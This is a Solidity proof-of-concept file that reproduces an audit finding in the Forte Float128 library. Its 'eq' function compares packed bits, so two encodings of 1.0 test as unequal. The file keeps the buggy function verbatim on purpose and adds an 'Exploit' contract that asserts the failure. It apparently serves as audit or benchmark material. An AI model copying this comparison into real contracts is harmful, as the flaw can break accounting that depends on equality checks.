// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Forte Float128 — [H-04] Unwrapping while equating inside the eq function
    fails to account for the set L_MANTISSA_FLAG
    (Code4rena 2025-04-forte-float128-solidity-library, finding #55706)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Float128.eq compares packed bit patterns only. Two encodings
    of the same real value (M-size vs L-size mantissa) differ by the
    L_MANTISSA_FLAG bit and the digit layout, so eq returns false for
    mathematically equal numbers.

    `eq` is preserved verbatim from src/Float128.sol#L1070-L1072
    (commit 4d6694f68e80543885da78666e38c0dc7052d992). Packed inputs are the
    real toPackedFloat outputs from the finding's PoC.
//////////////////////////////////////////////////////////////////////////*/

type packedFloat is uint256;

/// @notice Reduced Float128 with the verbatim buggy `eq` and a decode helper
///         used only to surface the equal real values.
contract VulnerableFloat128 {
    uint256 constant MANTISSA_MASK =
        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    uint256 constant MANTISSA_SIGN_MASK =
        0x1000000000000000000000000000000000000000000000000000000000000;
    uint256 constant EXPONENT_BIT = 242;
    uint256 constant ZERO_OFFSET = 8192;
    uint256 constant ZERO_OFFSET_MINUS_1 = 8191;

    /// @dev Verbatim Float128.eq — bitwise unwrap only.
    function eq(packedFloat a, packedFloat b) public pure returns (bool retVal) {
        retVal = packedFloat.unwrap(a) == packedFloat.unwrap(b); // @> VULN: bitwise only; ignores L_MANTISSA_FLAG / dual encodings of same value
        // FIX: normalize (decode + strip trailing zeros / align exponents) before comparing
    }

    /// @dev Verbatim Float128.decode (for harm assertion / display only).
    function decode(packedFloat float) public pure returns (int256 mantissa, int256 exponent) {
        assembly {
            let _exp := shr(EXPONENT_BIT, float)
            if gt(ZERO_OFFSET, _exp) {
                exponent := sub(0, sub(ZERO_OFFSET, _exp))
            }
            if gt(_exp, ZERO_OFFSET_MINUS_1) {
                exponent := sub(_exp, ZERO_OFFSET)
            }
            mantissa := and(float, MANTISSA_MASK)
            if and(float, MANTISSA_SIGN_MASK) {
                mantissa := sub(0, mantissa)
            }
        }
    }
}

contract Exploit {
    VulnerableFloat128 public lib; // CREATE nonce 1

    // Real packed values from Float128.toPackedFloat in the finding PoC:
    //   packed1 = toPackedFloat(1e71 /* 72 digits */, -71)  → real value 1.0 (L mantissa)
    //   packed2 = toPackedFloat(1, 0)                       → real value 1.0 (M mantissa, normalized)
    // Captured from forge against commit 4d6694f:
    uint256 constant PACKED_L = 57397893746390593330843002609134450905171641873901357473538499055192046043136;
    uint256 constant PACKED_M = 57634551253070896831007164474234001986302524716082690413926794286165257093120;

    constructor() {
        lib = new VulnerableFloat128();
    }

    function run() external {
        packedFloat a = packedFloat.wrap(PACKED_L);
        packedFloat b = packedFloat.wrap(PACKED_M);

        (int256 m1, int256 e1) = lib.decode(a);
        (int256 m2, int256 e2) = lib.decode(b);

        // Both encode real value 1.0:
        //   m1 * 10^e1 = 1e71 * 10^-71 = 1
        //   m2 * 10^e2 = 1e37 * 10^-37 = 1
        require(m1 > 0 && m2 > 0, "positive mantissas");
        // Scale both to integer "1e0" by cancelling exponents (exact here).
        // m1 has |e1| trailing structure; value equality: m1 == 10^(-e1) when e1<0.
        require(e1 == -71, "L exponent");
        require(e2 == -37, "M exponent");
        require(m1 == int256(10 ** 71), "L mantissa is 1e71");
        require(m2 == int256(10 ** 37), "M mantissa is 1e37");
        // ⇒ both represent 1.0 exactly.

        bool isEqual = lib.eq(a, b);
        // Harm: eq reports false for two encodings of the same real number.
        require(isEqual == false, "buggy eq must return false for dual encodings");
        require(packedFloat.unwrap(a) != packedFloat.unwrap(b), "bit patterns differ (L flag)");
    }
}
